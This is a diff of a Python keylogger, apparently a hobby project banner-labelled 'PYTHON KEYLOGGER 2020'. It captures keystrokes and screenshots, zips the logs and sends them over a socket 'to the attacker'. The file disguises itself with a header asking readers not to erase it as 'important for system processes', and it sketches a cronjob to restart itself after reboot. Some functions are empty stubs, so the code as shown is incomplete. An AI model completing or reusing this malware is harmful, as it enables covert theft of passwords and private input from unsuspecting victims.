@@ -7,19 +7,24 @@ THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE!!
 '''
 
 from pynput import keyboard
+from zipfile import ZipFile
 import pyautogui as pygrab
 import threading
-import mechanize
-import zipfile, sys, os, time
+import socket
+import sys, os, time
 import subprocess
+
+
 
 log = ''
 
 def main():
 	global log
-	directory, to_append = make_dir(), 'log_' + make_name()
+	directory, to_append = make_get_dir(), 'log_' + make_name()
 	save_screen()
-	zip_and_send(directory,to_append)
+	zipped = zip_folder(directory)
+	socket_send(zipped)
+
 	# start the keylogger
 	with keyboard.Listener(
 		on_press=on_press) as listener:
@@ -93,14 +98,61 @@ def save_screen():
 	take_screen.start()
 
 '''
-Zip the folder that was created and 
-email the zipped folder to the attacker
-Params : directory to zip, name of zipped file
+Zip folder contents before sending as email
+Param : directory of folder location
 '''
-def zip_and_send(direc, zip_name):
-	# create browser
-	brow = mechanize.Browser()
-		     
-	
+def zip_folder(direc):
+	# list to contain all path of files to zip
+	file_paths = []
+	zip_name = 'zipped_file.zip'
+
+	for root, directories, files in os.walk(direc):
+		for file in files:
+			# joining absolute path with file name
+			filepath = os.path.join(root, file)
+			# append filepath to list containing all file paths
+			file_paths.append(filepath)
+
+	# creating zipped file
+	with ZipFile(zip_name, 'w') as zipped:
+		'''
+		for every file in list of file paths
+			add file to zip file
+		'''
+		for file in file_paths:
+			zipped.write(file)
+
+		return zipped
+
+'''
+send the zipped folder to the attacker
+Param : zipped file created by zip_folder function
+'''
+def socket_send(zipped_file):
+	# create server socket and send file to whoever connects
+
+
+
+'''
+Create cronjob to startup keylogger after reboot
+'''
+def create_cronjob():
+	# use subprocess to create cronjob to start up keylogger
+	# after restarting
+
+
+
 if __name__ == '__main__':
+	print('''
+			PYTHON KEYLOGGER 2020
+. -------------------------------------------------------------------.        
+| [Esc] [F1][F2][F3][F4][F5][F6][F7][F8][F9][F0][F10][F11][F12] o o o|        
+|                                                                    |        
+| [`][1][2][3][4][5][6][7][8][9][0][-][=][_<_] [I][H][U] [N][/][*][-]|        
+| [|-][Q][W][E][R][T][Y][U][I][O][P][{][}] | | [D][E][D] [7][8][9]|+||        
+| [CAP][A][S][D][F][G][H][J][K][L][;]['][#]|_|           [4][5][6]|_||        
+| [^][\\][Z][X][C][V][B][N][M][,][.][/] [__^__]    [^]    [1][2][3]| ||        
+| [c]   [a][________________________][a]   [c] [<][V][>] [ 0  ][.]|_||        
+`--------------------------------------------------------------------'        
+	''')
 	main()
